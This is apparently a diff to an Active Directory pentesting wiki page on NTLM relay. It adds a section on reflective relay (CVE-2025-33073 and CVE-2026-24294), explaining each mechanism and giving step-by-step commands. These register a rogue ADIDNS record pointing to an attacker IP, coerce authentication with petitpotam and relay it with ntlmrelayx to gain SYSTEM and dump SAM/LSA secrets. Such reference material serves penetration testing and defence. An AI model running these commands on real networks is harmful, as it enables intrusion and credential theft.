@@ -104,7 +104,7 @@ LdapRelayScan.py -u "user" -p "password" -dc-ip "DC_IP_address" -method BOTH
 
 <Callout type="warn">
 
-When combining NTLM relay with Responder for [name poisoning](/ad/movement/mitm-and-coerced-authentications#llmnr-nbt-ns-mdns-name-poisoning), testers need to make sure that Responder's servers are deactivated, otherwise they will interfere with ntlmrelayx ones.
+When combining NTLM relay with Responder for [name poisoning](/ad/movement/mitm-and-coerced-authentications), testers need to make sure that Responder's servers are deactivated, otherwise they will interfere with ntlmrelayx ones.
 
 ```
 sed -i 's/SMB = On/SMB = Off/g' /PATH/TO/Responder/Responder.conf
@@ -196,7 +196,7 @@ ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
 
 <Callout type="info">
 
-This technique is usually combined with a [PushSubscription abuse (a.k.a. PrivExchange)](/ad/movement/mitm-and-coerced-authentications#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains (`WriteDACL` over domain object, see Abusing ACEs) to escalate a domain user privileges (`--escalate-user`).
+This technique is usually combined with a [PushSubscription abuse (a.k.a. PrivExchange)](/ad/movement/mitm-and-coerced-authentications) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains (`WriteDACL` over domain object, see Abusing ACEs) to escalate a domain user privileges (`--escalate-user`).
 
 </Callout>
 
@@ -254,11 +254,105 @@ nc 127.0.0.1 11000
 </Tab>
 </Tabs>
 
+### NTLM Reflective Relay
+
+Reflective relay consists of relaying an NTLM authentication **back to the originating machine itself**, triggered [from a coercion](/ad/movement/mitm-and-coerced-authentications). Synacktiv published a series of articles demonstrating successive techniques, each bypassing the mitigation introduced for the previous one.
+
+| CVE | Patched | Mechanism | Status |
+| :--- | :--- | :--- | :--- |
+| [CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073) | June 2025 | ADIDNS record with marshalled target info, tricking the loopback check | tooling public |
+| [CVE-2026-24294](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-24294) | March 2026 | SMB port multiplexing, reusing a low-priv TCP connection | tooling not public |
+| CVE-2025-58726 / CVE-2026-26128 | | Same outcome over Kerberos, via Unicode normalisation | see [Kerberos relay](/ad/movement/kerberos/kerberos-relay) |
+
+#### CVE-2025-33073
+
+Registering a DNS record that embeds [marshalled target information](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html) (e.g. `HOST1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) makes `lsasrv!LsapCheckMarshalledTargetInfo` strip the serialised suffix, leaving just `HOST`. `msv1_0!SspIsTargetLocalhost` then treats the target as local, so the client includes its workstation and domain names in the `NTLM_NEGOTIATE`.
+
+The victim server sees matching names and sets `NTLMSSP_NEGOTIATE_LOCAL_CALL` in the `NTLM_CHALLENGE`. A coercion makes `lsass.exe` (running as SYSTEM) authenticate to the attacker; on receiving that flag it copies its **SYSTEM access token** into the server context. Relaying the `NTLM_AUTHENTICATE` back to the victim makes the server retrieve and impersonate that token, granting `NT AUTHORITY\SYSTEM` over SMB.
+
+<Callout type="info">
+
+Check the target does not enforce SMB signing first:
+
+```bash
+netexec smb "$RANGE" --gen-relay-list targets.txt
+```
+
+If signing is enforced, relaying over HTTP may still work, for instance to the AD CS Web Enrollment endpoint via [ESC8](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8).
+
+</Callout>
+
+The coerced machine and the relay target are the same here, so the record uses the NetBIOS name of **the victim machine**.
+
+```bash
+# 1. Register a rogue ADIDNS record pointing at the attacker
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add \
+  -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d "$ATTACKER_IP"
+
+# 2. Relay, then coerce the victim toward the rogue hostname
+ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support --remove-sign-seal
+
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" \
+  "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "$TARGET_FQDN"
+
+# 3. Clean up the record afterwards
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove \
+  -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
+```
+
+<Callout type="warn">
+
+`--remove-sign-seal` only exists in [Synacktiv's impacket fork](https://github.com/synacktiv/impacket). It drops `NTLMSSP_NEGOTIATE_SEAL` from the negotiate and authenticate messages, which this technique requires.
+
+</Callout>
+
+<Callout type="info">
+
+A single record can target **any** vulnerable machine: `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. Once the serialised target info is stripped only `localhost` remains, so the loopback check succeeds regardless of the target's hostname.
+
+By default [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) then [dumps the SAM and LSA secrets](/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets) of the target.
+
+</Callout>
+
+#### CVE-2026-24294 (SMB port multiplexing)
+
+This bypasses the CVE-2025-33073 patch using **SMB port multiplexing**, introduced in Windows 11 24H2 and Server 2025. `WNetAddConnection4W` allows mounting a share on an arbitrary TCP port, and the Windows SMB client reuses existing TCP connections for matching share paths **regardless of the originating privilege level**.
+
+A low-privileged user pre-establishes a connection to the attacker on a custom port. When a coercion forces `lsass.exe` to authenticate toward the same share path, it reuses that connection, so the privileged NTLM blob flows through the attacker's socket and is relayed back to the target.
+
+```powershell
+# 1. On the target, a low-privileged local user mounts a share on a custom port
+net use \\$ATTACKER_IP\share /tcpport:$PORT
+```
+
+```bash
+# 2. A modified smbserver.py listens on that port to extract the privileged blob
+smbserver.py -port $PORT share .
+
+#    while ntlmrelayx relays it to the target
+ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support
+
+# 3. Coerce lsass.exe toward the same share path
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "$ATTACKER_IP" "$TARGET_FQDN"
+```
+
+<Callout type="warn">
+
+The modified `smbserver.py` and `PetitPotam.exe` needed here were **not public** at the time of writing. The flow above reflects the described attack but cannot be run end to end without them. Watch [Synacktiv's impacket fork](https://github.com/synacktiv/impacket) and their [publications](https://www.synacktiv.com/publications).
+
+</Callout>
+
+<Callout type="info">
+
+This targets **Windows Server 2025** by default. **Windows 11 24H2** enforces SMB signing, which needs an additional bypass.
+
+</Callout>
+
 ### Tips & tricks :bulb:
 
 The ntlmrelayx tool offers features making it a very valuable asset when pentesting an Active Directory domain:
 
-* It can work with mitm6 (for [DHCPv6 + DNS poisoning](/ad/movement/mitm-and-coerced-authentications#ipv6-dns-poisoning)) by enabling IPv6 support with the `-6` option (IPv6 support is not required since most hosts will send IPv4 but using this option is recommended since it will allow relay servers to work with IPv4 and IPv6)
+* It can work with mitm6 (for [DHCPv6 + DNS poisoning](/ad/movement/mitm-and-coerced-authentications)) by enabling IPv6 support with the `-6` option (IPv6 support is not required since most hosts will send IPv4 but using this option is recommended since it will allow relay servers to work with IPv4 and IPv6)
 * It supports SMB2. It can be enabled with the `-smb2support` option
 * It implements **CVE-2019-1040** with the `--remove-mic` option, usually needed when attempting "cross-protocols unsigning relays" (e.g. **SMB to SMB-with-required-signing, or SMB to LDAP/S).** This option can also be used when NTLMv1 is allowed (NTLMv1 doesn't support MIC).
 * it implements **CVE-2019-1019** with the `-remove-target` and `-machine-account` arguments
